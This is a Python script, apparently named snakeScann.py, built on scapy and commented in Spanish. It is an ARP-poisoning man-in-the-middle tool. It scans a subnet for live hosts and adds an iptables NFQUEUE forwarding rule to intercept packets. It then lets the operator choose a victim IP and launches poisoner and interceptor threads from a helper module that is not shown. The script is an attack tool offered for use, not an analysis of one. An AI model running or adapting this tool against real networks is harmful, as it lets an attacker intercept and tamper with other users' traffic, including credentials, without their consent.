from scapy.all import *
import snake_utils
import threading
import time
import os
import sys
import signal

def usage():
    print "Usage "
    print "specify [interface] [target_subnet] [gateway_ip]"
    print "example: sudo python snakeScann.py wlp1s0 192.168.1.0/24 192.168.1.1"
    sys.exit(0)

"""
CONFIGURACIOES
"""
signal.signal(signal.SIGINT, snake_utils.handler)
if len(sys.argv) != 4:
    usage()
else :
    interface = sys.argv[1]
    target_subnet = sys.argv[2]
    gateway_ip = sys.argv[3]
    #obtener la mac del gateway
    gateway_mac = snake_utils.get_mac(gateway_ip)
    # set our interface
    print "[*] Setting up Interface %s" % (interface)
    conf.iface = interface
    # turn off output
    conf.verb = 0

# If you want to use it for MITM :
iptablesr = "iptables -I FORWARD -j NFQUEUE --queue-num 0"
print("Setting up IPTABLES rules:")
print(iptablesr)
os.system(iptablesr)
print "-----------------------------"
time.sleep(2)
os.system("clear")
"""
fin configuraciones
"""
# hosts_live sera una lista de tuplas de largo 3, que contendran:
# ip, mac y vendedor de los dispositivos encontrados en la subnet
hosts_live = snake_utils.hosts_discovery(target_subnet)
if len(hosts_live) != 0 :
    scan_semaphore = True #trigger -> la respuesta 88 del cliente(user_reseponse=88)
    while scan_semaphore :
        print "Hosts discovered! "
        print "Total Hosts = %d" % len(hosts_live)
        print "id     IP                        MAC                     VENDOR"
        #Imprimir los host detectados
        for (i,(ip,mac,vendor)) in enumerate(hosts_live, start=0):
            print "[%d]-> %s         %s        %s " % (i,ip,mac,vendor)

        print "[99] -> Scan again"
        print "[88] -> Poison IP"
        user_response = input("Answer: ")
        if user_response == 99 :
            hosts_live = snake_utils.hosts_discovery(target_subnet)
            os.system("clear")#limpiar pantalla
        else:
            if user_response == 88 :
                scan_semaphore = False
                target_host_poison = hosts_live[ input("Poison [*]IP -> ") ]
                target_ip_poison = target_host_poison[0]
                target_mac_poison = target_host_poison[1]
                #start aro poisioning atack
                poison_thread = threading.Thread(target=snake_utils.poisoner, args=(gateway_ip, gateway_mac,target_ip_poison,target_mac_poison))
                poison_thread.start()
                time.sleep(2)
                #start intercepter
                intercepter_thread = threading.Thread(target=snake_utils.intercepter)
                intercepter_thread.start()
            else :
                print "[!] No valid option"
                time.sleep(2)
                os.system("clear")#limpiar pantalla
else :
    print "[!!!] No host discovered :C"
    sys.exit(0)